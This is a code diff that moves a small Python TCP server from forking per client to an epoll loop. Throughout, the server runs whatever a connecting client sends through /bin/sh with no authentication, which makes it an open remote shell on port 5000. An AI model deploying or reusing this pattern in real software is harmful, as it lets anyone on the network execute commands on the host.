@@ -1,27 +1,16 @@
 import socket
 import os
-import sys
 import signal
+import select
 
 HOST = ""
 PORT = 5000
 
 signal.signal(signal.SIGCHLD, signal.SIG_IGN)
 
-
-def handle_client():
-    read_side, write_side = os.pipe()
-    recv_data = conn.recv(4096)
-
-    pid2 = os.fork()
-    if pid2:
-        conn.send(os.read(read_side, 100))
-    else:
-        os.dup2(write_side, 1)
-        os.execl("/bin/sh", "sh", "-c", recv_data)
-
-
 try:
+    epoll = select.epoll()
+
     s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
 
     s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
@@ -30,19 +19,29 @@ try:
     s.bind((HOST, PORT))
     s.listen()
 
+    epoll.register(s, select.POLLIN)
+
     while True:
-        conn, addr = s.accept()
-        print('Connected by', addr)
+        desc_list = epoll.poll()
+        for fd, event in desc_list:
+            if fd == s.fileno():
+                conn, _ = s.accept()
+                epoll.register(conn, select.POLLIN)
+                continue
+            if event == select.POLLIN:
+                cn = socket.socket(fileno=fd)
+                recv_data = cn.recv(4096)
 
-        pid = os.fork()
+                print(recv_data)
 
-        if pid:
-            conn.close()
-        else:
-            s.close()
-            handle_client()
-            conn.close()
-            sys.exit(0)
+                read_side, write_side = os.pipe()
+
+                if os.fork():
+                    cn.send(os.read(read_side, 100))
+                    epoll.unregister(cn)
+                else:
+                    os.dup2(write_side, 1)
+                    os.execl("/bin/sh", "sh", "-c", recv_data)
 
 except OSError as e:
     print("Socket error({0}): {1}".format(e.errno, e.strerror))
